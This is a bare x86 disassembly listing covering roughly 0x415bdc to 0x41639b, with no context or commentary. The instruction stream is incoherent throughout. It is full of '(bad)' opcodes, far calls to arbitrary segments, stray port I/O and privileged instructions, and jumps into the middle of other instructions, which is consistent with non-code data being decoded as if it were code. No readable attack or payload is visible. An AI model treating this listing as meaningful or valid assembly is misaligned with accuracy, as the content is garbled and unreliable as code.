  415bdc:	mov    bl,0xc
  415bde:	lds    edi,FWORD PTR [ecx+0xf1d13ef]
  415be4:	push   edx
  415be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be6:	add    ebp,DWORD PTR [edi+ebx*8-0x4d9203e7]
  415bed:	sbb    al,0x57
  415bef:	xchg   dh,dh
  415bf1:	fsubr  QWORD PTR [edx+esi*8-0x4e]
  415bf5:	(bad)  [ecx-0x1dfe99ea]
  415bfb:	push   ebp
  415bfc:	leave  
  415bfd:	push   ss
  415bfe:	ds push ds
  415c00:	loope  0x415b8e
  415c02:	scas   eax,DWORD PTR es:[edi]
  415c03:	jmp    0xa2ebb7a9
  415c08:	not    ah
  415c0a:	cdq    
  415c0b:	mov    esp,0xe1e05754
  415c10:	xor    ecx,DWORD PTR [ebx]
  415c12:	push   ss
  415c13:	je     0x415c02
  415c15:	mov    DWORD PTR [ebx],eax
  415c17:	push   es
  415c18:	imul   esp,esp,0x70978c9a
  415c1e:	jbe    0x415be4
  415c20:	and    bh,BYTE PTR [esi+0x24]
  415c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c24:	loope  0x415c43
  415c26:	mov    ebp,DWORD PTR [eax+ebp*1+0x54cb327b]
  415c2d:	ficom  DWORD PTR [eax+0x12497286]
  415c33:	sbb    al,0xb2
  415c35:	inc    edi
  415c36:	push   ebp
  415c37:	pop    edx
  415c38:	lods   al,BYTE PTR ds:[esi]
  415c39:	in     al,dx
  415c3a:	sahf   
  415c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c3c:	sbb    al,0xe7
  415c3e:	imul   ebx,DWORD PTR [ebp-0x9da343b],0x58d8939e
  415c48:	mov    bl,0x26
  415c4a:	dec    edx
  415c4b:	test   eax,0x386ed33b
  415c50:	not    BYTE PTR ds:0xcab9a50a
  415c56:	cmp    DWORD PTR [edx+ebx*4+0x27],esi
  415c5a:	cli    
  415c5b:	inc    ebx
  415c5c:	mov    dh,0x19
  415c5e:	call   0x154a:0x5dbecfc2
  415c65:	rcr    BYTE PTR [edi],0xa7
  415c68:	inc    ecx
  415c69:	retf   
  415c6a:	(bad)  
  415c6b:	add    edx,ebx
  415c6d:	fs pushf 
  415c6f:	dec    ebp
  415c70:	mov    esp,0xe53e7631
  415c75:	enter  0xe716,0x3a
  415c79:	retf   
  415c7a:	sub    eax,0x110b7085
  415c7f:	dec    ecx
  415c80:	lock mov ds:0xd258f4e5,eax
  415c86:	call   0x160b:0x13f3dbc2
  415c8d:	pop    ebp
  415c8e:	ins    DWORD PTR es:[edi],dx
  415c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c90:	imul   ecx,DWORD PTR [edi+0x2d],0xc6cc12ab
  415c97:	outs   dx,DWORD PTR ds:[esi]
  415c98:	push   es
  415c99:	pop    edi
  415c9a:	xchg   esp,eax
  415c9b:	and    BYTE PTR ds:0x51274cf6,0x19
  415ca2:	sub    DWORD PTR [ecx-0x59b80ce8],0xfffffffa
  415ca9:	cdq    
  415caa:	div    dl
  415cac:	sbb    al,0x40
  415cae:	aam    0xd7
  415cb0:	es or  eax,0x6fb28d0a
  415cb6:	inc    ebx
  415cb7:	ja     0x415c58
  415cb9:	sahf   
  415cba:	cmp    BYTE PTR [edi+0x25],ah
  415cbd:	je     0x415cff
  415cbf:	pop    ss
  415cc0:	mov    ecx,DWORD PTR [eax+eiz*4]
  415cc3:	out    0xdf,al
  415cc5:	sbb    ah,ch
  415cc7:	loopne 0x415d34
  415cc9:	hlt    
  415cca:	cli    
  415ccb:	cmc    
  415ccc:	pop    ecx
  415ccd:	adc    ebx,esp
  415ccf:	xor    al,0x46
  415cd1:	in     al,0x9a
  415cd3:	enter  0x3b00,0x8a
  415cd7:	jmp    0x415d2a
  415cd9:	aam    0xc5
  415cdb:	mov    al,ds:0x32c38674
  415ce0:	ror    BYTE PTR [ebx+0x70],0x9a
  415ce4:	add    cl,BYTE PTR [ecx]
  415ce6:	popf   
  415ce7:	lock add BYTE PTR [esi+0x69],0x19
  415cec:	sub    al,0x6b
  415cee:	xchg   edi,eax
  415cef:	mov    edi,DWORD PTR [ebp-0x5158942c]
  415cf5:	jge    0x415ce4
  415cf7:	push   ebp
  415cf8:	jmp    0x415ceb
  415cfa:	pop    esp
  415cfb:	std    
  415cfc:	mov    ebx,0x881744c3
  415d01:	or     edi,DWORD PTR [eax+0x475f1d7c]
  415d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d08:	enter  0xd8b1,0x5a
  415d0c:	int    0xea
  415d0e:	sub    ecx,ebp
  415d10:	mov    dl,0x6f
  415d12:	ss ret 0xd957
  415d16:	push   ebx
  415d17:	scas   eax,DWORD PTR es:[edi]
  415d18:	xor    eax,0x25a78670
  415d1d:	pushfw 
  415d1f:	mov    ebp,0xfabbd83e
  415d24:	mov    dl,0x4f
  415d26:	xor    al,0x4d
  415d28:	fmul   QWORD PTR [eax-0x65aed6f]
  415d2e:	fcomp  DWORD PTR [ecx-0x7dd5d960]
  415d34:	fcmovb st,st(7)
  415d36:	push   0x87e6c392
  415d3b:	enter  0xb1b8,0x1a
  415d3f:	add    BYTE PTR ds:0x8c200c1b,al
  415d45:	or     eax,DWORD PTR [edx-0x7a]
  415d48:	sub    ebp,0xabbba0c0
  415d4e:	cdq    
  415d4f:	pop    edi
  415d50:	movsx  di,WORD PTR [ebp-0x47]
  415d55:	mov    bl,0xf3
  415d57:	idiv   DWORD PTR [esp+ecx*1-0x7f6bb729]
  415d5e:	dec    eax
  415d5f:	xlat   BYTE PTR ds:[ebx]
  415d60:	or     dh,BYTE PTR [esi+0x5d]
  415d63:	inc    edi
  415d64:	dec    esi
  415d65:	add    al,BYTE PTR [edi+0x79b71ef]
  415d6b:	sub    esi,DWORD PTR [edx+0x667fe9ba]
  415d71:	mov    ebp,?
  415d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d74:	or     DWORD PTR [ecx+esi*1-0x2c8ea20d],edx
  415d7b:	mov    esi,DWORD PTR [edx+0x154261d0]
  415d81:	push   edx
  415d82:	push   ebp
  415d83:	fbld   TBYTE PTR [edx]
  415d85:	or     ebx,DWORD PTR [edi+0x1c87218f]
  415d8b:	add    al,BYTE PTR [ebx+ebp*8]
  415d8e:	call   0xd98a:0x255fb43e
  415d95:	adc    DWORD PTR [edx],ecx
  415d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d98:	mov    ch,0x7c
  415d9a:	adc    DWORD PTR [eax+0x36],esi
  415d9d:	pop    esi
  415d9e:	add    eax,0xf650b210
  415da3:	push   0xbfd4e175
  415da8:	mov    esp,0xdb5d210a
  415dad:	cmp    dl,bh
  415daf:	repnz adc bl,ch
  415db2:	pop    ecx
  415db3:	fidiv  DWORD PTR [ebx+0x6195f075]
  415db9:	fs ins DWORD PTR es:[edi],dx
  415dbb:	sbb    DWORD PTR [edx-0x6a],ebp
  415dbe:	mov    ds:0x5ed469a,al
  415dc3:	mov    dh,0xc4
  415dc5:	or     ecx,DWORD PTR [esp+edx*4+0x2d12543b]
  415dcc:	mov    al,0x3
  415dce:	(bad)  
  415dcf:	call   0x99fe:0xc7c240cf
  415dd6:	push   es
  415dd7:	test   al,0x8a
  415dd9:	dec    esp
  415dda:	fmul   DWORD PTR [ecx+0x60348b52]
  415de0:	clc    
  415de1:	ja     0x415d7d
  415de3:	mov    BYTE PTR [ecx],bl
  415de5:	pusha  
  415de6:	inc    esi
  415de7:	jo     0x415dc6
  415de9:	int    0x3f
  415deb:	mov    ds:0x948f5fc8,eax
  415df0:	mov    ebx,0x9446aa8b
  415df5:	rcr    DWORD PTR [ebx+0x21ebb342],cl
  415dfb:	mov    esp,0x267e411d
  415e00:	push   ebp
  415e01:	xor    BYTE PTR [esi],cl
  415e03:	sub    BYTE PTR [edx],dh
  415e05:	std    
  415e06:	adc    ecx,DWORD PTR [ecx+0x67]
  415e09:	sahf   
  415e0a:	adc    BYTE PTR [eax+0x129fbdb2],bl
  415e10:	inc    esi
  415e11:	(bad)  
  415e13:	stos   BYTE PTR es:[edi],al
  415e14:	mov    ebx,0x3e30a00b
  415e19:	jp     0x415dfb
  415e1b:	shr    ebx,cl
  415e1d:	inc    esi
  415e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e1f:	mov    bh,0xf3
  415e21:	jge    0x415dbd
  415e23:	push   ds
  415e24:	dec    edx
  415e25:	dec    ecx
  415e26:	icebp  
  415e27:	jbe    0x415e22
  415e29:	or     dl,BYTE PTR [ebx]
  415e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2c:	dec    esp
  415e2d:	xchg   ebp,eax
  415e2e:	fldcw  WORD PTR [esi+0x6f0ae8eb]
  415e34:	inc    edx
  415e35:	inc    ebx
  415e36:	call   0x9ae0:0xc6abf6ee
  415e3d:	(bad)  
  415e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e40:	push   ss
  415e41:	ret    0x4225
  415e44:	cdq    
  415e45:	xor    al,0xb7
  415e47:	popf   
  415e48:	mov    bh,0xc3
  415e4a:	jl     0x415e7a
  415e4c:	ror    DWORD PTR [ecx],0x25
  415e4f:	addr16 pop ecx
  415e51:	xchg   ebx,eax
  415e52:	in     al,0x17
  415e54:	mov    dl,0xc9
  415e56:	cmp    cl,BYTE PTR [edi-0x37]
  415e59:	push   edx
  415e5a:	inc    ebx
  415e5b:	push   esi
  415e5c:	sbb    DWORD PTR [eax],0xffffff8a
  415e5f:	enter  0xe87,0x53
  415e63:	cli    
  415e64:	dec    edi
  415e65:	int3   
  415e66:	jecxz  0x415e5d
  415e68:	cmp    ebx,DWORD PTR [ecx]
  415e6a:	sbb    eax,0x294b8544
  415e6f:	pop    ecx
  415e70:	jecxz  0x415e7a
  415e72:	call   0xb3d2:0xd3c3cd63
  415e79:	jmp    0xafbc:0x3236a95b
  415e80:	sar    DWORD PTR [edx],1
  415e82:	int    0x34
  415e84:	imul   esi,DWORD PTR [edi+0x3b6c125a],0xeaf4929a
  415e8e:	out    0x8a,eax
  415e90:	jg     0x415e48
  415e92:	or     BYTE PTR [ecx-0x6b37bc04],ch
  415e98:	xor    dh,BYTE PTR [eax+edi*4]
  415e9b:	push   esp
  415e9c:	imul   ebp,DWORD PTR [edx+ebx*4-0x10],0x6d862cee
  415ea4:	and    BYTE PTR [eax],ah
  415ea6:	aas    
  415ea7:	(bad)  
  415ea8:	jp     0x415f21
  415eaa:	push   ds
  415eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eac:	pop    esp
  415ead:	dec    ebx
  415eae:	mov    ah,0x5c
  415eb0:	mov    edx,0x246c325a
  415eb5:	cmp    al,0xa4
  415eb7:	cmp    DWORD PTR [ecx+0x17],esp
  415eba:	push   ss
  415ebb:	or     al,0xf2
  415ebd:	jbe    0x415ed8
  415ebf:	and    DWORD PTR [edx+0x3e],edi
  415ec2:	icebp  
  415ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ec4:	call   0xc18:0xc3ce81e9
  415ecb:	jae    0x415e7f
  415ecd:	ins    BYTE PTR es:[edi],dx
  415ece:	mov    edx,0xea8205d8
  415ed3:	xchg   esi,eax
  415ed4:	ror    DWORD PTR [ebx],1
  415ed6:	fwait
  415ed7:	leave  
  415ed8:	frstor [esi]
  415eda:	sbb    BYTE PTR [ecx],ch
  415edc:	jns    0x415f14
  415ede:	test   DWORD PTR [ecx-0x4f],ecx
  415ee1:	repnz adc eax,0x9e841bcc
  415ee7:	(bad)  
  415ee8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415eea:	jae    0x415f1d
  415eec:	retf   0xf20b
  415eef:	in     al,0xf5
  415ef1:	sbb    esi,edx
  415ef3:	addr16 xchg ebx,eax
  415ef5:	push   ds
  415ef6:	call   0x8bc3:0xb128e427
  415efd:	fld    QWORD PTR [eax+0x2b8863a0]
  415f03:	xchg   edi,eax
  415f04:	loopne 0x415f31
  415f06:	push   es
  415f07:	sub    eax,0x8f9a1e53
  415f0c:	ss xchg ebx,eax
  415f0e:	mov    DWORD PTR [ecx],eax
  415f10:	dec    edx
  415f11:	mov    al,ds:0x48a8a73f
  415f16:	or     dh,BYTE PTR [ebx+0x24]
  415f19:	dec    edi
  415f1a:	rol    dh,cl
  415f1c:	push   edx
  415f1d:	std    
  415f1e:	xchg   ebp,eax
  415f1f:	fidivr WORD PTR [eax+0x78c33c37]
  415f25:	call   0xbbc0:0x20d76f5a
  415f2c:	pop    ss
  415f2d:	mov    DWORD PTR [edi],esi
  415f2f:	daa    
  415f30:	mov    ebp,0xf314eb58
  415f35:	ret    0xd9a
  415f38:	js     0x415f79
  415f3a:	cwde   
  415f3b:	ret    
  415f3c:	idiv   BYTE PTR [ebx+ebp*2]
  415f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f40:	inc    esp
  415f41:	mov    al,ds:0x1e9021fb
  415f46:	arpl   WORD PTR [esi-0x7c357e4e],dx
  415f4c:	pushf  
  415f4d:	mov    esp,0xb330f22
  415f52:	imul   edi,DWORD PTR [edi],0x2
  415f55:	call   0xc99a:0x8fb1f972
  415f5c:	lods   eax,DWORD PTR ds:[esi]
  415f5d:	mov    ah,0xd1
  415f5f:	mov    edi,0x9fce3017
  415f64:	aaa    
  415f65:	add    eax,0x2cf1751a
  415f6a:	jnp    0x415f9d
  415f6c:	pop    edx
  415f6d:	into   
  415f6e:	xchg   esp,eax
  415f6f:	leave  
  415f70:	(bad)  
  415f72:	out    0xc7,eax
  415f74:	lahf   
  415f75:	mov    al,ds:0xf75af42
  415f7a:	inc    esi
  415f7b:	or     ah,BYTE PTR [ebx+0x2b]
  415f7e:	mov    al,0x67
  415f80:	cmp    eax,0xb2152948
  415f85:	jle    0x415f31
  415f87:	xchg   ebx,eax
  415f88:	sbb    al,0xa8
  415f8a:	pushw  es
  415f8c:	enter  0x3d08,0x76
  415f90:	mov    ebp,0x3a8c01c3
  415f95:	mov    esp,DWORD PTR [edi]
  415f97:	es mov dl,0xb0
  415f9a:	push   0x9003fb8f
  415f9f:	pop    edx
  415fa0:	push   ebx
  415fa1:	and    eax,0xb3de695
  415fa6:	sub    edi,DWORD PTR [edi+ecx*8+0x480a7194]
  415fad:	ins    BYTE PTR es:[edi],dx
  415fae:	call   0x47a2:0x7f07f16f
  415fb5:	add    BYTE PTR [edi+edi*8],dl
  415fb8:	and    eax,eax
  415fba:	lahf   
  415fbb:	in     eax,dx
  415fbc:	jns    0x416039
  415fbe:	shl    DWORD PTR [edi],1
  415fc0:	rcl    DWORD PTR ds:0xf4b5adbb,1
  415fc6:	xchg   ebx,eax
  415fc7:	sub    BYTE PTR [ecx+ecx*4],0xfa
  415fcb:	pop    esi
  415fcc:	mov    bl,0xd0
  415fce:	mov    bh,0xa7
  415fd0:	in     eax,dx
  415fd1:	pop    edi
  415fd2:	mov    ah,0x57
  415fd4:	xchg   esi,eax
  415fd5:	mov    cl,bh
  415fd7:	or     esi,DWORD PTR [edx-0x752f4e28]
  415fdd:	popa   
  415fde:	ret    0x2acc
  415fe1:	inc    ebx
  415fe2:	loope  0x415fd3
  415fe4:	mov    dl,0xb5
  415fe6:	jbe    0x415fcb
  415fe8:	(bad)  
  415fe9:	into   
  415fea:	mov    esi,0xce22b290
  415fef:	cdq    
  415ff0:	add    bl,BYTE PTR [ebp+0x1c9e1596]
  415ff6:	enter  0x50f0,0xb
  415ffa:	xchg   BYTE PTR ds:0x29562465,bh
  416000:	(bad)  
  416001:	lds    ebx,FWORD PTR [ebx-0x16d5ecd9]
  416007:	clc    
  416008:	mov    bh,0x52
  41600a:	pop    ebp
  41600b:	dec    ebp
  41600c:	inc    ebp
  41600d:	or     ebp,DWORD PTR [edi+ebp*4-0x3d5860a5]
  416014:	repz mov al,0x9a
  416017:	mov    ah,0xde
  416019:	fwait
  41601a:	xchg   esi,eax
  41601b:	cmp    BYTE PTR [ebp+0x15],cl
  41601e:	xor    DWORD PTR [ebp-0x1ee51779],ebx
  416024:	loope  0x416074
  416026:	jnp    0x41608c
  416028:	call   0xb6384fd2
  41602d:	jne    0x416098
  41602f:	xor    eax,0xe94a97aa
  416034:	in     eax,0xcb
  416036:	jne    0x415fe9
  416038:	neg    DWORD PTR [esi+0x3a]
  41603b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41603c:	arpl   WORD PTR [ecx+0x7be2d29d],di
  416042:	aas    
  416043:	call   0x1eb9:0x44daeb10
  41604a:	mov    esp,0x9afc8dbc
  41604f:	das    
  416050:	jno    0x416094
  416052:	sbb    BYTE PTR [edi-0x1e],dl
  416055:	or     ah,BYTE PTR [esi+ecx*4]
  416058:	test   BYTE PTR ss:[ecx],0x1e
  41605c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605d:	fisttp WORD PTR [edi-0x621b4ab6]
  416063:	inc    edx
  416064:	out    0xac,eax
  416066:	test   edi,eax
  416068:	xor    DWORD PTR [edi],ebp
  41606a:	or     BYTE PTR [edi+eax*8+0xb],dh
  41606e:	scas   al,BYTE PTR es:[edi]
  41606f:	mov    cl,0x11
  416071:	rep ins BYTE PTR es:[edi],dx
  416073:	out    0xe5,al
  416075:	xor    BYTE PTR [edx-0x70a4bcbf],bl
  41607b:	cdq    
  41607c:	dec    ebp
  41607d:	dec    ecx
  41607e:	shl    DWORD PTR [eax+0x3943143f],1
  416084:	xor    al,0x98
  416086:	or     ebx,0xc0a7c422
  41608c:	mov    bl,0x42
  41608e:	daa    
  41608f:	loope  0x4160b9
  416091:	adc    BYTE PTR [ebp+0x781a5a7c],0xa6
  416098:	add    esi,ebx
  41609a:	mov    esi,0x34ccb410
  41609f:	xchg   edi,eax
  4160a0:	jl     0x4160b2
  4160a2:	xchg   ecx,eax
  4160a3:	cmp    BYTE PTR [ebx+0xc271a9d],cl
  4160a9:	sub    eax,0xf93f7402
  4160ae:	(bad)  
  4160af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b0:	test   DWORD PTR [edx+0xd],ecx
  4160b3:	stos   DWORD PTR es:[edi],eax
  4160b4:	xor    eax,0xb111bd3a
  4160b9:	push   ecx
  4160ba:	or     bh,dh
  4160bc:	add    BYTE PTR ds:0x83fd7c8c,0x20
  4160c3:	jo     0x4160ec
  4160c5:	jmp    0xc2800840
  4160ca:	adc    eax,DWORD PTR ds:0x64482293
  4160d0:	mov    dl,0xe2
  4160d2:	add    ecx,DWORD PTR [edi]
  4160d4:	pop    esp
  4160d5:	retf   
  4160d6:	(bad)  
  4160d7:	jmp    ebx
  4160d9:	or     edi,esi
  4160db:	and    BYTE PTR [ebp-0x52],ah
  4160de:	dec    edi
  4160df:	xchg   esp,eax
  4160e0:	pushf  
  4160e1:	cwde   
  4160e2:	xchg   esp,eax
  4160e3:	fmulp  st(5),st
  4160e5:	aam    0x8e
  4160e7:	pop    es
  4160e8:	mov    esi,0x6cba2d46
  4160ed:	or     ebx,DWORD PTR [ebx]
  4160ef:	cld    
  4160f0:	cmp    ch,BYTE PTR [edx+0x6a]
  4160f3:	fimul  DWORD PTR [ebp+edx*1-0x66]
  4160f7:	test   DWORD PTR [ecx-0x70],edi
  4160fa:	or     dl,dl
  4160fc:	pop    edi
  4160fd:	lods   eax,DWORD PTR ds:[esi]
  4160fe:	in     al,0xda
  416100:	(bad)  
  416101:	add    al,0xf1
  416103:	mov    edi,0x18bbb90c
  416108:	cmp    eax,0xc257fd85
  41610d:	je     0x4160a8
  41610f:	push   ebp
  416111:	add    eax,0xabeef904
  416116:	mov    ds:0x53762069,al
  41611b:	popf   
  41611c:	xlat   BYTE PTR ds:[ebx]
  41611d:	adc    ebx,DWORD PTR ds:0xac3039ba
  416123:	pop    es
  416124:	sbb    esi,DWORD PTR [edi+0x3b]
  416127:	fdiv   DWORD PTR [edx-0xd1da2e1]
  41612d:	push   ebp
  41612e:	adc    al,BYTE PTR [ebx-0x1]
  416131:	or     eax,DWORD PTR [ecx+0x18200bc2]
  416137:	test   DWORD PTR [edi+0x66],esi
  41613a:	call   0x1c5b:0xc583245
  416141:	gs lahf 
  416143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416144:	xor    al,0x15
  416146:	cwde   
  416147:	mov    ebx,ds
  416149:	sub    bh,BYTE PTR [eax]
  41614b:	sub    al,0xa5
  41614d:	je     0x41610f
  41614f:	mov    bh,0xb3
  416151:	mov    bh,0x8
  416153:	fild   QWORD PTR [eax-0x4a]
  416156:	push   esi
  416157:	and    ecx,eax
  416159:	or     BYTE PTR ds:0x11fcd2fe,ch
  41615f:	repz adc bh,BYTE PTR [eax+0x2eb2d817]
  416166:	shl    BYTE PTR [ebx-0x6a5aa471],0x7
  41616d:	jb     0x416147
  41616f:	fidiv  DWORD PTR [eax]
  416171:	or     esi,DWORD PTR [edi+0x4]
  416174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416175:	mov    ah,0x35
  416177:	sub    DWORD PTR [edi],0x8d0d9a80
  41617d:	lods   al,BYTE PTR ds:[esi]
  41617e:	inc    ebx
  41617f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  416181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416182:	mov    edx,0x932a35a7
  416187:	std    
  416188:	sub    DWORD PTR [edx-0x32],0x34
  41618c:	mov    dl,0x32
  41618e:	test   BYTE PTR [edx],ch
  416190:	xchg   ecx,eax
  416191:	and    bl,0x49
  416194:	stos   BYTE PTR es:[edi],al
  416195:	or     edx,DWORD PTR [ecx-0x2d]
  416198:	xlat   BYTE PTR ds:[ebx]
  416199:	jns    0x416129
  41619b:	xchg   edi,eax
  41619c:	and    eax,0x8933a476
  4161a1:	push   edi
  4161a2:	dec    ecx
  4161a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161a4:	out    dx,eax
  4161a5:	xlat   BYTE PTR ds:[ebx]
  4161a6:	sub    al,0xfc
  4161a8:	mov    eax,ds:0x69e7adc3
  4161ad:	or     esp,DWORD PTR [ebx+0x559c4255]
  4161b3:	mov    WORD PTR [ecx+0x55629a28],es
  4161b9:	inc    ecx
  4161ba:	mov    edx,0xfedc561a
  4161bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161c0:	inc    ebp
  4161c1:	popa   
  4161c2:	es dec esi
  4161c4:	and    al,al
  4161c6:	fndisi(8087 only) 
  4161c8:	mov    dl,0x77
  4161ca:	int    0xb2
  4161cc:	test   al,0xba
  4161ce:	inc    edi
  4161cf:	sbb    BYTE PTR gs:[edx],cl
  4161d2:	or     eax,0xb36678a4
  4161d7:	inc    ebp
  4161d8:	or     edi,ebx
  4161da:	and    eax,esp
  4161dc:	mov    dl,0x8f
  4161de:	sar    DWORD PTR [ecx],cl
  4161e0:	sub    cl,ch
  4161e2:	inc    edx
  4161e3:	(bad)  
  4161e4:	sahf   
  4161e5:	or     esi,DWORD PTR [ecx]
  4161e7:	pop    ebp
  4161e8:	mov    al,ds:0xcf286945
  4161ed:	outs   dx,BYTE PTR ds:[esi]
  4161ee:	xchg   ebp,eax
  4161ef:	add    al,BYTE PTR [eax+0x24]
  4161f2:	mul    esi
  4161f4:	call   0x6085:0x7e361e8a
  4161fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161fc:	push   ecx
  4161fd:	jns    0x4161b9
  4161ff:	repz sbb dh,bl
  416202:	jne    0x416196
  416204:	int    0xb7
  416206:	call   0xadd4:0x35f4f4e2
  41620d:	xchg   ebx,eax
  41620e:	cmp    BYTE PTR [ebp-0x2b],al
  416211:	dec    DWORD PTR [edx-0x59]
  416214:	loopne 0x416256
  416216:	dec    edi
  416217:	pop    ds
  416218:	lea    esp,[ebx]
  41621a:	pushf  
  41621b:	xlat   BYTE PTR ds:[ebx]
  41621c:	mov    cl,0x76
  41621e:	repnz in eax,0x49
  416221:	jo     0x416273
  416223:	pop    ds
  416224:	rcl    BYTE PTR [edi-0x18],1
  416227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416228:	cwde   
  416229:	xlat   BYTE PTR ds:[ebx]
  41622a:	int3   
  41622b:	cld    
  41622c:	int    0xc2
  41622e:	imul   esp,edx,0xffffff8a
  416231:	or     DWORD PTR [ecx+0x27],esi
  416234:	mov    ebx,0x63fbeb76
  416239:	js     0x416261
  41623b:	test   al,0x64
  41623d:	stos   DWORD PTR es:[edi],eax
  41623e:	sub    al,0xe9
  416240:	xchg   edx,eax
  416241:	fwait
  416242:	adc    bl,0x98
  416245:	inc    ecx
  416246:	call   0x4fce:0x65c10c0b
  41624d:	adc    al,0x14
  41624f:	aaa    
  416250:	mov    bl,0xb
  416252:	ds inc eax
  416254:	aaa    
  416255:	pop    ebx
  416256:	sub    BYTE PTR [eax],dl
  416258:	out    0x9d,al
  41625a:	call   0x8e70:0xcc7ed12e
  416261:	inc    edx
  416262:	loop   0x41620b
  416264:	rol    DWORD PTR [ecx],cl
  416266:	push   ss
  416267:	fldln2 
  416269:	sbb    cl,BYTE PTR [esi]
  41626b:	dec    esi
  41626c:	mov    dl,0xc7
  41626e:	lods   al,BYTE PTR ds:[esi]
  416270:	js     0x416248
  416272:	outs   dx,BYTE PTR ds:[esi]
  416273:	and    esp,DWORD PTR [ebx+ecx*1+0x31]
  416277:	cmp    eax,0xd8417072
  41627c:	pop    esp
  41627d:	cmp    eax,0x4141279a
  416282:	pop    edi
  416283:	mov    ss,WORD PTR [edx]
  416285:	sub    al,0x32
  416287:	inc    ecx
  416288:	xchg   DWORD PTR [ebx],ecx
  41628a:	les    edx,FWORD PTR [eax+0xb3c1d07]
  416290:	dec    esp
  416291:	cmp    eax,0x20ee3e9a
  416296:	scas   al,BYTE PTR es:[edi]
  416297:	es sbb al,0x6d
  41629a:	dec    esi
  41629b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629c:	or     edx,esp
  41629e:	(bad)  
  41629f:	(bad)  
  4162a0:	xor    eax,0xb50ca903
  4162a5:	(bad)  
  4162a6:	inc    eax
  4162a7:	loop   0x41629f
  4162a9:	test   ecx,0xe9ab9cd3
  4162af:	mov    esp,DWORD PTR [ebp-0x1f66b1f5]
  4162b5:	mov    eax,0xc2a4ae2c
  4162ba:	call   0x7a20:0xbbcfbaef
  4162c1:	stos   BYTE PTR es:[edi],al
  4162c2:	cmc    
  4162c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c4:	jge    0x4162e5
  4162c6:	sbb    edi,0x750ef03e
  4162cc:	inc    eax
  4162cd:	pop    ecx
  4162ce:	popf   
  4162cf:	sub    DWORD PTR [esi-0x4d98b2e8],ebp
  4162d5:	pop    eax
  4162d6:	jl     0x41626d
  4162d8:	repz or esi,DWORD PTR [ebp+0x88e6c31]
  4162df:	add    eax,0xb59a154e
  4162e4:	out    0x7e,al
  4162e6:	xchg   esp,eax
  4162e7:	stos   DWORD PTR es:[edi],eax
  4162e8:	stos   DWORD PTR es:[edi],eax
  4162e9:	inc    edi
  4162ea:	cdq    
  4162eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ed:	and    al,0xae
  4162ef:	cli    
  4162f0:	cmp    al,0xd1
  4162f2:	push   ds
  4162f3:	ja     0x416353
  4162f5:	retf   
  4162f6:	call   0xc4fc:0x8734f97a
  4162fd:	add    esi,esp
  4162ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416300:	mov    bl,0xd2
  416302:	jns    0x416381
  416304:	push   cs
  416305:	sub    DWORD PTR [ecx-0x74f742e8],esi
  41630b:	sahf   
  41630c:	xchg   ebx,eax
  41630d:	neg    BYTE PTR [ecx+0x48ee548d]
  416313:	ja     0x41634c
  416315:	cmp    eax,0x2035b3fa
  41631a:	mov    eax,ds:0x855ab25c
  41631f:	fcom   DWORD PTR [ebp-0x21]
  416322:	push   0xffffffff
  416324:	mov    bh,0xc
  416326:	shl    BYTE PTR [ecx+0x13],0xf0
  41632a:	pop    edx
  41632b:	jbe    0x416358
  41632d:	fs add al,0xba
  416330:	mov    cs,WORD PTR [eax-0x51a798a7]
  416336:	sub    BYTE PTR [edx],ch
  416338:	call   0xa58b:0xd77a11c
  41633f:	stos   DWORD PTR es:[edi],eax
  416340:	retf   0x68a2
  416343:	mov    DWORD PTR [ecx+0x33],ebp
  416346:	xchg   ebx,eax
  416347:	xor    bl,BYTE PTR ds:[edi+0x54]
  41634b:	cli    
  41634c:	fmul   st,st(0)
  41634e:	popf   
  41634f:	fisubr WORD PTR [edx]
  416351:	ret    0xbd9a
  416354:	ds hlt 
  416356:	inc    ecx
  416357:	cmp    eax,0xeff1a7a7
  41635c:	mov    al,ds:0x2f7f9ae7
  416361:	cmc    
  416362:	ret    
  416363:	adc    eax,ebx
  416365:	sub    BYTE PTR [edx+0x1fe482c8],bl
  41636b:	push   0x22
  41636d:	cld    
  41636e:	and    ah,BYTE PTR [edi+0x4a9fcfec]
  416374:	mov    bl,0xa7
  416376:	add    ah,dl
  416378:	lds    ebx,FWORD PTR [ecx-0x69b45466]
  41637e:	(bad)  
  41637f:	daa    
  416380:	or     bh,BYTE PTR [ecx]
  416382:	or     esp,DWORD PTR [edi-0x68d82c04]
  416388:	xor    DWORD PTR [di-0x19],0xffffffb2
  41638d:	mov    ebx,0xa6cd529d
  416392:	test   BYTE PTR [ecx],0x1
  416395:	add    eax,0xb77715be
  41639a:	lods   eax,DWORD PTR ds:[esi]
  41639b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
